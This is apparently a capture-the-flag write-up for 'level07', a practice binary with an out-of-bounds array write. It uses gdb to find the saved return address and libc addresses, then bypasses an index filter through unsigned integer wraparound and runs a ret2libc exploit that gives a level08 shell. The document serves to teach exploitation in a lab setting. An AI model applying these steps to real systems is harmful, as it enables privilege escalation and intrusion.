# level07

## Step 1: Understand the program
1. The program allows to store numbers in an array of unsigned int.
2. The array have no end
3. We can store numbers at any index expect if:
    - index is divisible by `3`
    - High byte of the number is `0xb7`
        ```c
        if ( index == 3 * (index / 3) || HIBYTE(unum) == 183 ) // ((unum) >> 8) & 0xFF) == 0xB7
        ```

## Goal
Since we can store any value at "any" position, the goal is to overwrite the `saved eip` of main function with a [__Ret2libc__ __attack__](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc).

## Step 2: find where is saved eip
```bash
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd6f0:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd6e8, args:
 Locals at 0xffffd6e8, Previous frame's sp is 0xffffd6f0
 Saved registers:
  ebp at 0xffffd6e8, eip at 0xffffd6ec
(gdb)
```

saved `eip` is at `0xffffd6ec`


## Step 3: Find the offset between the array and the saved eip

Store the random number `19951999` at `array[1]`

Find the value through the stack

```bash
(gdb) b *store_number+160
(gdb) r
(gdb) x/20d $esp
[...]
0xffffd4d0:	134515421	-10972	0	-136137024
0xffffd4e0:	-10520	-134280624	19951999	1
0xffffd4f0:	0	-8228	-10520	134514927
[...]
```
```bash
(gdb) x/d 0xffffd528
0xffffd528:	19951999
```
__The array is at `0xffffd524`__. We subtract 4 because it is at the `[1]` position, and it is an array of unsigned int (4 bytes long).

```bash
(gdb) p (0xffffd6ec - 0xffffd524)
$1 = 456
(gdb) p (0xffffd6ec - 0xffffd524) / 4
$2 = 114
(gdb)
```

__Offset == 114__  (114 step of 4 bytes)


## Step 4: Find the address of system functions
```bash
(gdb) p system
$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

__0xf7e6aed0 = 4159090384__

```bash
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```
__0xf7f897ec = 4160264172__


https://stackoverflow.com/questions/19124095/return-to-lib-c-buffer-overflow-exercise-issue

## Exploit

Given that the index can't be divisible by 3. we can't require index 114. To store value at this position we overlap `unsigned int max`.


- $UINTMAX = 2^{32} - 1$  

- $\frac{2^{32}}{4} + 114 = 1073741938$




At last, quit to pass by through the return of `main`.

```console
$ /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```
